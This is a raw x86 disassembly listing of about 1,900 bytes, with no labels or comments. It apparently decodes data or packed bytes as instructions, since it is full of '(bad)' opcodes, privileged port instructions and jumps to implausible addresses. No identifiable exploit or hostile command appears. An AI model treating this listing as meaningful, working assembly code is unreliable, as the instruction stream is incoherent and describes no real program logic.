  40e57a:	adc    al,0x22
  40e57c:	jmp    0x40e50d
  40e57e:	xchg   esi,eax
  40e57f:	es add al,0x7e
  40e582:	push   0x23
  40e584:	fnstcw WORD PTR [ebx-0x40]
  40e587:	outs   dx,BYTE PTR ds:[esi]
  40e588:	mov    ebx,0x3141e06d
  40e58d:	xor    al,0xd0
  40e58f:	pop    eax
  40e590:	pop    ebx
  40e591:	in     eax,0x11
  40e593:	adc    DWORD PTR [ebp-0x11],ebx
  40e596:	jbe    0x40e550
  40e598:	pop    esi
  40e599:	arpl   WORD PTR [esi+0x7dfe4da2],ax
  40e59f:	int    0x82
  40e5a1:	imul   esp,DWORD PTR [ecx+0xe],0x6b
  40e5a5:	push   ss
  40e5a6:	xor    BYTE PTR [eax],ch
  40e5a8:	inc    ebp
  40e5a9:	and    BYTE PTR [edx+0x2397e6b2],dh
  40e5af:	jne    0x40e591
  40e5b1:	xlat   BYTE PTR ds:[ebx]
  40e5b2:	and    BYTE PTR [ebx+0xa34d6da],0xf2
  40e5b9:	int3   
  40e5ba:	inc    edx
  40e5bb:	mov    bh,0xdb
  40e5bd:	mov    DWORD PTR [ebp-0x4],esp
  40e5c0:	mov    ecx,0x8d526793
  40e5c5:	nop
  40e5c6:	idiv   BYTE PTR [esi-0x37]
  40e5c9:	pop    ss
  40e5ca:	(bad)  
  40e5cb:	cmp    eax,0x22360d93
  40e5d0:	dec    edx
  40e5d1:	out    0x71,al
  40e5d3:	and    cl,BYTE PTR [edi]
  40e5d5:	fwait
  40e5d6:	dec    ebp
  40e5d7:	div    BYTE PTR [esp+eax*4-0xa26bdc2]
  40e5de:	test   BYTE PTR [ebx],dh
  40e5e0:	aas    
  40e5e1:	out    0xc0,al
  40e5e3:	aas    
  40e5e4:	pop    ss
  40e5e5:	dec    ebx
  40e5e6:	test   eax,0xfae7b828
  40e5eb:	enter  0x8b18,0xb9
  40e5ef:	js     0x40e57f
  40e5f1:	daa    
  40e5f2:	jb     0x40e602
  40e5f4:	push   ds
  40e5f5:	sbb    BYTE PTR [esi],dl
  40e5f7:	xlat   BYTE PTR ds:[ebx]
  40e5f8:	dec    ebx
  40e5f9:	inc    edx
  40e5fa:	jmp    0x40e663
  40e5fc:	sub    dl,BYTE PTR es:[ebp+0x407b22ed]
  40e603:	mov    eax,0x70793c7a
  40e608:	inc    esi
  40e609:	enter  0xf401,0xf6
  40e60d:	push   esi
  40e60e:	adc    eax,0x660941ef
  40e613:	push   eax
  40e614:	push   cs
  40e615:	mov    cl,0x25
  40e617:	push   ss
  40e618:	add    esp,DWORD PTR [edx]
  40e61a:	jae    0x40e676
  40e61c:	pop    ebx
  40e61d:	inc    edx
  40e61e:	mov    bl,0x4c
  40e620:	jecxz  0x40e5c0
  40e622:	addr16 inc ebx
  40e624:	mov    ch,0x50
  40e626:	dec    esp
  40e627:	mov    BYTE PTR ds:0x1a63ba76,dl
  40e62d:	pop    ebp
  40e62e:	repnz mov BYTE PTR [ebp-0x47456173],dh
  40e635:	retf   0x823e
  40e638:	mov    cl,0xe2
  40e63a:	fwait
  40e63b:	mov    ds:0xe976ff61,al
  40e640:	add    eax,0xa9026afd
  40e645:	jns    0x40e62c
  40e647:	(bad)  
  40e648:	cmp    bl,BYTE PTR [edi+0x57f71f79]
  40e64e:	lock or BYTE PTR ds:[eax-0x3ed5b5a7],0x3e
  40e657:	shl    DWORD PTR [ecx],cl
  40e659:	cwde   
  40e65a:	xchg   ah,ah
  40e65c:	xor    dh,dh
  40e65e:	aam    0x4b
  40e660:	and    edx,ebp
  40e662:	ret    
  40e663:	and    BYTE PTR [edx+eax*2-0x22c35f08],al
  40e66a:	inc    edi
  40e66b:	xchg   BYTE PTR [edx-0x3],dh
  40e66e:	xrelease xchg BYTE PTR [edx],al
  40e671:	mov    dh,0x40
  40e673:	sub    eax,0x54be01b4
  40e678:	fcomp  st(0)
  40e67a:	jmp    0xf1246d7a
  40e67f:	mov    cl,0x5e
  40e681:	popa   
  40e682:	stos   BYTE PTR es:[edi],al
  40e683:	and    ebx,DWORD PTR [esi+0x20]
  40e686:	sbb    DWORD PTR [edi+esi*1+0x70],edx
  40e68a:	bound  esp,QWORD PTR [ebx+0x5f]
  40e68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e68e:	cmp    dh,BYTE PTR [edx]
  40e690:	aad    0x72
  40e692:	pushf  
  40e693:	push   esp
  40e694:	test   al,0xa2
  40e696:	popa   
  40e697:	adc    eax,0x9e3fde64
  40e69c:	iret   
  40e69d:	mov    ecx,0xeaa13e5f
  40e6a2:	mov    al,0xca
  40e6a4:	and    al,0x78
  40e6a6:	lods   eax,DWORD PTR ds:[esi]
  40e6a7:	pop    edx
  40e6a8:	int3   
  40e6a9:	jo     0x40e65d
  40e6ab:	aas    
  40e6ac:	test   dh,al
  40e6ae:	fdivr  st(5),st
  40e6b0:	jp     0x40e63d
  40e6b2:	or     al,0x2f
  40e6b4:	pushf  
  40e6b5:	pop    ecx
  40e6b6:	xor    bh,bl
  40e6b8:	test   BYTE PTR [ebx],bh
  40e6ba:	cmp    al,0x6b
  40e6bc:	fs dec edi
  40e6be:	xor    ecx,eax
  40e6c0:	in     al,dx
  40e6c1:	mov    dh,0x96
  40e6c3:	jmp    0xc201:0xfeedabcc
  40e6ca:	and    eax,0x9800bc1f
  40e6cf:	addr16 nop
  40e6d1:	enter  0x4360,0x9f
  40e6d5:	addr16 cdq 
  40e6d7:	ret    0xfa90
  40e6da:	push   0x6b
  40e6dc:	inc    esp
  40e6dd:	or     BYTE PTR [edx-0x1c830877],dl
  40e6e3:	xor    esp,DWORD PTR [edx-0x2065f0e9]
  40e6e9:	sbb    esp,DWORD PTR ds:0xc143a6f0
  40e6ef:	outs   dx,BYTE PTR ds:[esi]
  40e6f0:	out    dx,al
  40e6f1:	ins    DWORD PTR es:[edi],dx
  40e6f2:	cli    
  40e6f3:	das    
  40e6f4:	ja     0x40e6fa
  40e6f6:	push   ebp
  40e6f7:	ds pushf 
  40e6f9:	pushf  
  40e6fa:	xor    ebp,DWORD PTR [eax-0x7c]
  40e6fd:	mov    ch,0x1b
  40e6ff:	adc    DWORD PTR cs:[edi],ebp
  40e702:	sbb    esp,DWORD PTR [eax+0x48]
  40e705:	sbb    dh,ch
  40e707:	and    bl,ch
  40e709:	and    eax,0x8d5adeb1
  40e70e:	int    0x5c
  40e710:	pop    eax
  40e711:	pop    esp
  40e712:	mov    esi,?
  40e714:	xchg   esp,eax
  40e715:	imul   DWORD PTR [eax+0x6a]
  40e718:	cmp    esi,DWORD PTR [edi]
  40e71a:	dec    edx
  40e71b:	js     0x40e736
  40e71d:	pop    ebp
  40e71e:	lds    esi,FWORD PTR [ebx]
  40e720:	sub    BYTE PTR [ebp-0x26],0x8a
  40e724:	jmp    0x6330:0x375f5651
  40e72b:	icebp  
  40e72c:	js     0x40e727
  40e72e:	jbe    0x40e72a
  40e730:	rcl    DWORD PTR [edi+ecx*2+0x1965f5d2],1
  40e737:	xor    eax,0xaa48a7c6
  40e73c:	xchg   DWORD PTR [eax+0x15cca217],ebp
  40e742:	mov    ah,0xb9
  40e744:	lods   al,BYTE PTR ds:[esi]
  40e745:	lods   eax,DWORD PTR ds:[esi]
  40e746:	xchg   BYTE PTR [eax+0x5b],ch
  40e749:	add    eax,0x837fdad2
  40e74e:	push   eax
  40e74f:	mov    al,ds:0xdd7e53d6
  40e754:	call   FWORD PTR [ebp+0x75]
  40e757:	pop    esp
  40e758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e759:	int    0x98
  40e75b:	pop    ebp
  40e75d:	or     al,0xdb
  40e75f:	xor    eax,0x34ad6ff9
  40e764:	or     DWORD PTR ds:0x44a0a69,ecx
  40e76a:	rcl    BYTE PTR [eax+0x7e230ff],cl
  40e770:	add    BYTE PTR [edi-0x336358fc],dl
  40e776:	movd   DWORD PTR [ebp-0x23],mm5
  40e77a:	and    BYTE PTR [edi+0x316637bf],al
  40e780:	jecxz  0x40e7e6
  40e782:	out    0x5,al
  40e784:	jmp    0xf945:0x7d92127d
  40e78b:	jne    0x40e724
  40e78d:	xor    DWORD PTR [ecx],eax
  40e78f:	popa   
  40e790:	pop    esi
  40e791:	arpl   WORD PTR [edx-0x2973c05c],bp
  40e797:	mov    dh,0xa0
  40e799:	(bad)  
  40e79a:	xor    al,0xbf
  40e79c:	jbe    0x40e7de
  40e79e:	mov    eax,0x72894711
  40e7a3:	arpl   WORD PTR [ebp-0x57],di
  40e7a6:	data16 hlt 
  40e7a8:	cmp    DWORD PTR [esi],ebx
  40e7aa:	(bad)  
  40e7ab:	shl    ebp,cl
  40e7ad:	pushf  
  40e7ae:	dec    ecx
  40e7af:	add    esi,ebp
  40e7b1:	call   DWORD PTR [edx-0x71e0d35b]
  40e7b7:	xor    ch,BYTE PTR [ebx+0x68]
  40e7ba:	out    dx,eax
  40e7bb:	push   esp
  40e7bc:	out    0x35,al
  40e7be:	div    bh
  40e7c0:	bound  ebp,QWORD PTR [eax]
  40e7c2:	in     eax,0xe9
  40e7c4:	and    BYTE PTR ds:0xaf4e8eec,dh
  40e7ca:	icebp  
  40e7cb:	test   bl,bh
  40e7cd:	int    0xfe
  40e7cf:	lds    esp,FWORD PTR [esi-0x1c]
  40e7d2:	sar    DWORD PTR [ebx],cl
  40e7d4:	lock out dx,eax
  40e7d6:	les    ecx,FWORD PTR [ebp-0x65]
  40e7d9:	int    0x9
  40e7db:	mul    BYTE PTR [eax]
  40e7dd:	shl    BYTE PTR [ebx+0x31],0x37
  40e7e1:	ins    BYTE PTR es:[edi],dx
  40e7e2:	add    esp,esp
  40e7e4:	cmc    
  40e7e5:	hlt    
  40e7e6:	push   ss
  40e7e7:	adc    cl,BYTE PTR [ecx-0x72]
  40e7ea:	pusha  
  40e7eb:	jb     0x40e7ce
  40e7ed:	in     al,0x59
  40e7ef:	icebp  
  40e7f0:	jmp    0x40e80d
  40e7f2:	sub    DWORD PTR [edx+0xa],0xa9368ca0
  40e7f9:	retf   0xcda6
  40e7fc:	out    dx,al
  40e7fd:	js     0x40e7d3
  40e7ff:	in     al,0xae
  40e801:	sub    DWORD PTR [edx-0x30],ebp
  40e804:	scas   eax,DWORD PTR es:[edi]
  40e805:	aas    
  40e806:	mov    eax,ds:0x4af7b042
  40e80b:	cmc    
  40e80c:	xor    al,0x68
  40e80e:	dec    ebp
  40e80f:	dec    esi
  40e810:	pop    eax
  40e811:	and    DWORD PTR [ebx+0x53],ebx
  40e814:	jae    0x40e83a
  40e816:	stc    
  40e817:	push   es
  40e818:	pop    eax
  40e819:	inc    esi
  40e81a:	sub    BYTE PTR [esi+0x6a19d4ab],bh
  40e820:	ja     0x40e7f5
  40e822:	(bad)  
  40e823:	or     BYTE PTR [esi],ah
  40e825:	ins    DWORD PTR es:[edi],dx
  40e826:	add    cl,BYTE PTR [ebx]
  40e828:	fwait
  40e829:	call   0x60d6dfa6
  40e82e:	push   eax
  40e82f:	inc    edx
  40e830:	aad    0xb6
  40e832:	jge    0x40e7c1
  40e834:	cwde   
  40e835:	mov    DWORD PTR [ebp-0x3d],ebp
  40e838:	add    DWORD PTR [edi],ebp
  40e83a:	add    al,0x3
  40e83c:	inc    ecx
  40e83d:	and    BYTE PTR [edi-0x44],dh
  40e840:	or     ebx,0x4d3c91c0
  40e846:	push   edi
  40e847:	fst    QWORD PTR [esi+0xae17aae]
  40e84d:	mov    eax,DWORD PTR [eax]
  40e84f:	(bad)  
  40e850:	ins    BYTE PTR es:[di],dx
  40e852:	ins    DWORD PTR es:[edi],dx
  40e853:	stos   BYTE PTR es:[edi],al
  40e854:	or     BYTE PTR [ecx],bh
  40e856:	xchg   DWORD PTR [ebp-0x2c8fc132],eax
  40e85c:	es nop
  40e85e:	retf   0xe20a
  40e861:	mov    ds:0x4b6e7a1e,eax
  40e866:	adc    DWORD PTR ds:0x687e8559,ecx
  40e86c:	adc    eax,DWORD PTR [ebp-0x32b575ff]
  40e872:	dec    edx
  40e873:	and    esi,esp
  40e875:	xchg   eax,esp
  40e877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e878:	mov    bh,0x92
  40e87a:	shl    DWORD PTR [ebp+ebp*1+0x4a027f71],cl
  40e881:	push   0xd17c910d
  40e886:	and    edi,DWORD PTR [ebp+eiz*4-0x216210c]
  40e88d:	imul   edi,esi,0xbe7ae5b3
  40e893:	jp     0x40e8b5
  40e895:	daa    
  40e896:	mov    eax,ds:0x39a0c409
  40e89b:	pop    ebp
  40e89c:	shl    DWORD PTR [ebx],1
  40e89e:	shr    ah,cl
  40e8a0:	int3   
  40e8a1:	or     edi,DWORD PTR [edi+0x31]
  40e8a4:	pop    ss
  40e8a5:	mov    eax,0x432054c3
  40e8aa:	lea    eax,[ebx-0xf]
  40e8ad:	out    dx,al
  40e8ae:	outs   dx,DWORD PTR ds:[esi]
  40e8af:	adc    al,cl
  40e8b1:	cmc    
  40e8b2:	mov    eax,DWORD PTR [ebp-0x3178aa10]
  40e8b8:	ret    0x8e60
  40e8bb:	fcom   DWORD PTR [eax]
  40e8bd:	fs push ds
  40e8bf:	mov    cl,0x52
  40e8c1:	pop    edx
  40e8c2:	lods   al,BYTE PTR gs:[esi]
  40e8c4:	addr16 xor eax,0x81ff2b91
  40e8ca:	mov    esi,0x3eb95aa5
  40e8cf:	es and eax,0x762312b1
  40e8d5:	add    dh,al
  40e8d7:	add    eax,0x3fa67871
  40e8dc:	arpl   WORD PTR [ebp-0x8072d41],dx
  40e8e2:	dec    ebp
  40e8e3:	cmp    BYTE PTR [edi+0x5f],dh
  40e8e6:	sbb    dl,bh
  40e8e8:	out    dx,eax
  40e8e9:	jb     0x40e962
  40e8eb:	iret   
  40e8ec:	fwait
  40e8ed:	push   eax
  40e8ee:	outs   dx,DWORD PTR ds:[esi]
  40e8ef:	(bad)  
  40e8f0:	(bad)  
  40e8f2:	pop    ds
  40e8f3:	pop    DWORD PTR fs:[ecx-0x5]
  40e8f7:	and    eax,esp
  40e8f9:	aad    0x1a
  40e8fb:	pop    eax
  40e8fc:	mov    ah,0xb3
  40e8fe:	in     al,dx
  40e8ff:	or     eax,0xd7e2d4af
  40e904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e905:	inc    ebp
  40e906:	add    edx,edi
  40e908:	xchg   edx,eax
  40e909:	adc    ah,dl
  40e90b:	ror    DWORD PTR [ecx],0xd3
  40e90e:	jmp    0x40e904
  40e910:	xor    BYTE PTR [ebp+ecx*4-0x21],ch
  40e914:	(bad)  
  40e916:	cs in  eax,0x6
  40e919:	(bad)  
  40e91a:	cmp    BYTE PTR [eax],dl
  40e91c:	jmp    0x70456e1
  40e921:	out    dx,eax
  40e922:	adc    ecx,0xc22e8a79
  40e928:	xor    cl,BYTE PTR [edi]
  40e92a:	repz sbb eax,0xf7a185bc
  40e930:	push   0xbf3cbdd7
  40e935:	into   
  40e936:	mov    WORD PTR [edi*1-0x2299b9ec],?
  40e93d:	cmp    ebx,DWORD PTR [edx+eiz*4]
  40e940:	mov    ebp,0xefbb0fcc
  40e945:	std    
  40e946:	xor    BYTE PTR [ecx+eax*1],bh
  40e949:	jl     0x40e9b6
  40e94b:	ss fmul st,st(7)
  40e94e:	aam    0x3d
  40e950:	icebp  
  40e951:	sub    DWORD PTR [ecx-0x3e],ebx
  40e954:	add    DWORD PTR [eax-0x67],esi
  40e957:	inc    esi
  40e958:	mov    edx,0xde7a4548
  40e95d:	pop    esi
  40e95e:	push   ecx
  40e95f:	rcr    BYTE PTR [esi],cl
  40e961:	sub    BYTE PTR ds:0xee16a83b,dh
  40e967:	stc    
  40e968:	add    BYTE PTR [ebx+0xb2c860e],bl
  40e96e:	pushf  
  40e96f:	fist   WORD PTR cs:[ebp-0x78]
  40e973:	and    BYTE PTR [esi+0x166432a0],ch
  40e979:	sbb    eax,0xb8759570
  40e97e:	or     BYTE PTR [eax-0x6f],cl
  40e981:	rcl    BYTE PTR [edi+edx*8-0x45e2f761],1
  40e988:	sbb    al,0x84
  40e98a:	pop    ebx
  40e98b:	les    edx,FWORD PTR [ecx+edx*8+0x13]
  40e98f:	jns    0x40e9a3
  40e991:	arpl   WORD PTR [ecx-0x5d],sp
  40e994:	fisub  WORD PTR [ecx+esi*4-0x7c976d59]
  40e99b:	retf   
  40e99c:	xlat   BYTE PTR ds:[ebx]
  40e99d:	aas    
  40e99e:	push   cs
  40e99f:	jns    0x40ea0e
  40e9a1:	shr    esi,cl
  40e9a3:	pop    esi
  40e9a4:	jo     0x40e9c7
  40e9a6:	popf   
  40e9a7:	mov    dh,0x63
  40e9a9:	je     0x40e97b
  40e9ab:	fistp  DWORD PTR [esi]
  40e9ad:	and    DWORD PTR [edx-0x4d],esi
  40e9b0:	sub    al,0x0
  40e9b2:	and    eax,0xccbd13f9
  40e9b7:	sub    ecx,ecx
  40e9b9:	sub    bh,BYTE PTR [eax+ebx*8+0x67]
  40e9bd:	jne    0x40ea17
  40e9bf:	add    dl,BYTE PTR ds:0x8597fe29
  40e9c5:	xor    al,0x61
  40e9c7:	adc    al,BYTE PTR [ecx+eax*8]
  40e9ca:	mov    edx,0x255810b
  40e9cf:	adc    al,0x60
  40e9d1:	fwait
  40e9d2:	cli    
  40e9d3:	aaa    
  40e9d4:	ja     0x40e979
  40e9d6:	pop    ebp
  40e9d7:	fisubr DWORD PTR [edi-0x1ab6af47]
  40e9dd:	cli    
  40e9de:	arpl   bp,dx
  40e9e0:	mov    ds:0xa967da57,al
  40e9e5:	popa   
  40e9e6:	dec    edi
  40e9e7:	loop   0x40ea1f
  40e9e9:	cmp    al,0xc4
  40e9eb:	fsub   QWORD PTR [edx+eiz*8]
  40e9ee:	fcmovb st,st(0)
  40e9f0:	xchg   ecx,eax
  40e9f1:	jge    0x40e994
  40e9f3:	inc    dh
  40e9f5:	iret   
  40e9f6:	or     BYTE PTR [ecx],al
  40e9f8:	scas   al,BYTE PTR es:[edi]
  40e9f9:	mov    ah,0x4a
  40e9fb:	fmul   st(4),st
  40e9fd:	fwait
  40e9fe:	xor    cl,0x29
  40ea01:	stos   BYTE PTR es:[edi],al
  40ea02:	push   ebp
  40ea03:	and    bh,BYTE PTR [edi+eiz*1+0x5e452e70]
  40ea0a:	hlt    
  40ea0b:	lea    esi,[ecx-0x18117e6f]
  40ea11:	bound  eax,QWORD PTR [ebx]
  40ea13:	hlt    
  40ea14:	icebp  
  40ea15:	add    DWORD PTR [ecx+ecx*1],esp
  40ea18:	(bad)  
  40ea19:	fistp  DWORD PTR [edx-0x4b]
  40ea1c:	adc    bl,BYTE PTR [edx+0x74500872]
  40ea22:	fbld   TBYTE PTR [ebx+0x32]
  40ea25:	or     ebp,edi
  40ea27:	aaa    
  40ea28:	bound  ecx,QWORD PTR [ecx-0x32]
  40ea2b:	mov    ebp,0x84ac32c6
  40ea30:	cmp    DWORD PTR [ebx+0x332dd91b],ecx
  40ea36:	rcr    bh,cl
  40ea38:	ror    BYTE PTR [edx-0x3e],0x48
  40ea3c:	icebp  
  40ea3d:	lea    eax,[ebx]
  40ea3f:	pop    ss
  40ea40:	mov    ebp,0x1baa26d8
  40ea45:	push   0xfffffffc
  40ea47:	gs imul edx,DWORD PTR es:[edx+0x27363959],0xfffffff7
  40ea50:	mov    edi,0x1cfb933e
  40ea55:	jle    0x40eab3
  40ea57:	icebp  
  40ea58:	cwde   
  40ea59:	jg     0x40e9dc
  40ea5b:	hlt    
  40ea5c:	cmp    bh,BYTE PTR [ebp-0x25]
  40ea5f:	jecxz  0x40ea3c
  40ea61:	cmp    eax,0x6f759736
  40ea66:	call   esi
  40ea68:	stos   BYTE PTR es:[edi],al
  40ea69:	jb     0x40eabe
  40ea6b:	fistp  DWORD PTR [edi+eax*8]
  40ea6e:	lods   al,BYTE PTR ds:[esi]
  40ea6f:	mov    eax,ds:0xfe9308eb
  40ea74:	mov    ds:0x6807bd20,eax
  40ea79:	mov    dh,0x1
  40ea7b:	mov    ebp,0x20395512
  40ea80:	inc    eax
  40ea81:	sbb    cl,BYTE PTR [ebp-0x76]
  40ea84:	xchg   edi,eax
  40ea85:	xchg   ecx,eax
  40ea86:	or     DWORD PTR [eax],ebp
  40ea88:	and    BYTE PTR [eax-0x5a],0x86
  40ea8c:	mov    cl,0xc4
  40ea8e:	das    
  40ea8f:	(bad)  
  40ea91:	rcr    DWORD PTR [ebx+0x5],0x8a
  40ea95:	pop    ss
  40ea96:	aam    0xfe
  40ea98:	inc    edi
  40ea99:	ret    0x56ef
  40ea9c:	jbe    0x40eb02
  40ea9e:	mov    BYTE PTR ds:0xe5f44bd1,bl
  40eaa4:	push   ss
  40eaa5:	aad    0x87
  40eaa7:	stc    
  40eaa8:	fadd   QWORD PTR [edx+0x2d]
  40eaab:	ret    
  40eaac:	add    ecx,0xb6c2bb60
  40eab2:	lahf   
  40eab3:	push   es
  40eab4:	adc    al,0x97
  40eab6:	push   ebp
  40eab7:	mov    ebx,0xd2c13cd
  40eabc:	dec    ebx
  40eabd:	inc    esi
  40eabe:	popf   
  40eabf:	push   es
  40eac0:	retf   0xf764
  40eac3:	pop    ecx
  40eac4:	jmp    0xd27b:0x994f45e2
  40eacb:	cmp    eax,esp
  40eacd:	arpl   WORD PTR [edx-0x75eca6e5],bp
  40ead3:	pop    ebp
  40ead4:	sbb    bl,dl
  40ead6:	push   ebx
  40ead7:	(bad)  
  40ead8:	jmp    0x9bbdd2fc
  40eadd:	xchg   esp,eax
  40eade:	mov    ah,0xa9
  40eae0:	jg     0x40eb04
  40eae2:	test   al,0x39
  40eae4:	ret    
  40eae5:	xchg   esi,eax
  40eae6:	jb     0x40eb3f
  40eae8:	es das 
  40eaea:	pop    ebx
  40eaeb:	loope  0x40eb0b
  40eaed:	scas   al,BYTE PTR es:[edi]
  40eaee:	jbe    0x40eb66
  40eaf0:	sub    dh,BYTE PTR [eax-0x643fb6f3]
  40eaf6:	inc    edx
  40eaf7:	sahf   
  40eaf8:	aam    0x3f
  40eafa:	xchg   ecx,eax
  40eafb:	adc    al,dh
  40eafd:	in     eax,dx
  40eafe:	or     BYTE PTR [ecx-0x3db9661f],bh
  40eb04:	pop    edi
  40eb05:	jbe    0x40ead0
  40eb07:	imul   edx,DWORD PTR [ecx-0x34],0x2a
  40eb0b:	mov    ebp,0xd4b45ee2
  40eb10:	mov    cl,0x7a
  40eb12:	inc    ebp
  40eb13:	jecxz  0x40eb69
  40eb15:	pop    ss
  40eb16:	rcr    cl,cl
  40eb18:	mov    ch,0xa
  40eb1a:	sbb    al,ah
  40eb1c:	retf   
  40eb1d:	les    edx,FWORD PTR [eax+0x6d856f5a]
  40eb23:	adc    esi,DWORD PTR [ebx+0x51]
  40eb26:	xchg   esi,eax
  40eb27:	mov    edi,0xe9876e64
  40eb2c:	imul   BYTE PTR [eax]
  40eb2e:	xchg   esp,eax
  40eb2f:	dec    esp
  40eb30:	add    eax,0xe5c2634d
  40eb35:	add    al,BYTE PTR [ebp+0x182dd8b5]
  40eb3b:	sub    al,0x67
  40eb3d:	push   ebp
  40eb3e:	and    al,0x25
  40eb40:	bound  eax,QWORD PTR [ebp-0x51]
  40eb43:	js     0x40eb06
  40eb45:	jb     0x40eb8b
  40eb47:	cwde   
  40eb48:	add    dl,0x9d
  40eb4b:	mov    ds,WORD PTR [esi-0x79]
  40eb4e:	(bad)  
  40eb4f:	or     eax,0xfc58f76c
  40eb54:	push   ecx
  40eb55:	push   esi
  40eb56:	iret   
  40eb57:	lahf   
  40eb58:	pop    ecx
  40eb59:	test   DWORD PTR [eax+0x16],0x4f22bc0a
  40eb60:	data16 (bad) 
  40eb62:	adc    al,0xd0
  40eb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb65:	stc    
  40eb66:	add    eax,0x34511b08
  40eb6b:	(bad)
  40eb6f:	inc    esp
  40eb70:	loope  0x40eb94
  40eb72:	test   al,0x6d
  40eb74:	push   es
  40eb75:	dec    eax
  40eb76:	push   ss
  40eb77:	jl     0x40eb86
  40eb79:	pop    eax
  40eb7a:	xor    bl,al
  40eb7c:	and    al,0xd1
  40eb7e:	inc    eax
  40eb7f:	sub    dh,BYTE PTR [edx]
  40eb81:	in     al,0xb5
  40eb83:	xor    al,BYTE PTR [eax+0x3f]
  40eb86:	adc    DWORD PTR [eax],ebp
  40eb88:	aam    0x82
  40eb8a:	sub    al,0x5f
  40eb8c:	mov    edi,0xf9c458b0
  40eb91:	jae    0x40eb46
  40eb93:	and    edx,eax
  40eb95:	jmp    0x63cb:0x5de68e27
  40eb9c:	inc    esp
  40eb9d:	push   cs
  40eb9e:	or     eax,ebp
  40eba0:	cmp    ecx,ebx
  40eba2:	pushf  
  40eba3:	inc    edi
  40eba4:	arpl   WORD PTR [ecx],bx
  40eba6:	je     0x40eba8
  40eba8:	fwait
  40eba9:	imul   eax,DWORD PTR [esp+ecx*2-0x1ad68d09],0x16
  40ebb1:	in     al,0xb6
  40ebb3:	iret   
  40ebb4:	aam    0x7c
  40ebb6:	cmp    edi,esi
  40ebb8:	mov    edi,0x5bf2ad7d
  40ebbd:	adc    DWORD PTR [ebx-0x5d],ebx
  40ebc0:	fnstsw WORD PTR [edx+0x797d550e]
  40ebc6:	sbb    eax,0x780c443b
  40ebcb:	in     eax,dx
  40ebcc:	aas    
  40ebcd:	out    0xfd,al
  40ebcf:	(bad)  
  40ebd0:	fcom   QWORD PTR [ebp-0x315a230b]
  40ebd6:	ficomp WORD PTR [ebp+edx*1+0x27]
  40ebda:	or     bl,al
  40ebdc:	imul   ecx,ebx,0x5dc248d3
  40ebe2:	push   esp
  40ebe3:	mov    BYTE PTR ss:[edx+0x20],bl
  40ebe7:	(bad)  
  40ebe8:	adc    bl,BYTE PTR [eax+0x73b76857]
  40ebee:	(bad)  
  40ebf0:	xchg   esp,eax
  40ebf1:	push   ebx
  40ebf2:	xchg   edi,eax
  40ebf3:	cmc    
  40ebf4:	push   eax
  40ebf5:	mov    eax,ds:0x19f7d8f
  40ebfa:	xor    eax,DWORD PTR [ebp-0x73959635]
  40ec00:	shl    BYTE PTR [edx-0x53ccc072],0xbe
  40ec07:	test   BYTE PTR [edi+0x4a8a1c04],0xf
  40ec0e:	xchg   esi,eax
  40ec0f:	push   ebx
  40ec10:	retf   
  40ec11:	sbb    al,0xf4
  40ec13:	lea    ecx,[esi]
  40ec15:	test   al,0xca
  40ec17:	xchg   ebx,eax
  40ec18:	sub    eax,0x9b511d52
  40ec1d:	retf   0x8474
  40ec20:	and    BYTE PTR [ecx+0x1f6be911],0x15
  40ec27:	jno    0x40ec1b
  40ec29:	mov    edi,0x9dab578a
  40ec2e:	shl    BYTE PTR [edi],cl
  40ec30:	jmp    0x40ebed
  40ec32:	xchg   ebx,eax
  40ec33:	pop    es
  40ec34:	ror    BYTE PTR [edi-0x55263abb],1
  40ec3a:	mov    WORD PTR [eax],ds
  40ec3c:	scas   eax,DWORD PTR es:[edi]
  40ec3d:	repz pop bx
  40ec40:	clc    
  40ec41:	or     DWORD PTR [ecx-0x48],edi
  40ec44:	xchg   DWORD PTR [eax],esp
  40ec46:	arpl   WORD PTR [eax-0x3c],bp
  40ec49:	sub    edx,DWORD PTR [ebx-0x797807b4]
  40ec4f:	out    dx,eax
  40ec50:	(bad)  
  40ec51:	nop
  40ec52:	pop    ebp
  40ec53:	dec    ebp
  40ec54:	push   esi
  40ec55:	and    BYTE PTR [ecx+edx*2],dl
  40ec58:	xlat   BYTE PTR ds:[ebx]
  40ec59:	add    eax,0x3e3ab649
  40ec5e:	pop    edx
  40ec5f:	inc    ecx
  40ec60:	jp     0x40ecba
  40ec62:	leave  
  40ec63:	fisubr DWORD PTR [eax-0x6e708e5c]
  40ec69:	loop   0x40ec21
  40ec6b:	aam    0xf3
  40ec6d:	(bad)  
  40ec6e:	aas    
  40ec6f:	or     ecx,eax
  40ec71:	enter  0xf0f,0x97
  40ec75:	scas   al,BYTE PTR es:[edi]
  40ec76:	xchg   esp,eax
  40ec77:	push   esi
  40ec78:	and    ah,BYTE PTR ds:0xb7ccb8b3
  40ec7e:	and    DWORD PTR [ebx+ecx*4],ebp
  40ec81:	push   ebx
  40ec82:	shl    DWORD PTR ds:0xcb013643,0x4b
  40ec89:	push   edx
  40ec8a:	pop    edi
  40ec8b:	jp     0x40ec2a
  40ec8d:	mov    esp,fs
  40ec8f:	jns    0x40ece4
  40ec91:	test   BYTE PTR [ecx-0x4a],dh
  40ec94:	out    0x17,al
  40ec96:	ret    
  40ec97:	std    
  40ec98:	lods   al,BYTE PTR ds:[si]
  40ec9a:	adc    BYTE PTR [ebp+0x7],bl
  40ec9d:	jae    0x40ecf6
  40ec9f:	loope  0x40ed08
  40eca1:	lods   al,BYTE PTR ds:[esi]
  40eca2:	imul   ebp,DWORD PTR [eax+0x11],0x4d
  40eca6:	shl    BYTE PTR [ebp+ebx*2+0x37db9234],1
  40ecad:	test   BYTE PTR [esi-0x4d7e3db],dh
  40ecb3:	or     al,0x6c
  40ecb5:	inc    esp
  40ecb6:	cmp    esp,edi
  40ecb8:	or     DWORD PTR [edx+0x9],edx
  40ecbb:	or     eax,0x7efe6643
  40ecc0:	shl    BYTE PTR [edi-0x57],0x25
  40ecc4:	test   eax,0xcdee5f98
  40ecc9:	and    DWORD PTR [ecx+0x72c12eb3],0xffffffa0
  40ecd0:	inc    ebp
  40ecd1:	ror    DWORD PTR [edx+edi*2],cl
  40ecd4:	add    al,0xac
  40ecd6:	addr16 fcom st(7)
  40ecd9:	pop    esp
  40ecda:	sbb    DWORD PTR [edx+0x53],ebp
  40ecdd:	stc    
  40ecde:	fidiv  WORD PTR [eax+0x40ecb41e]
  40ece4:	fsub   DWORD PTR ds:0x43fb4e94
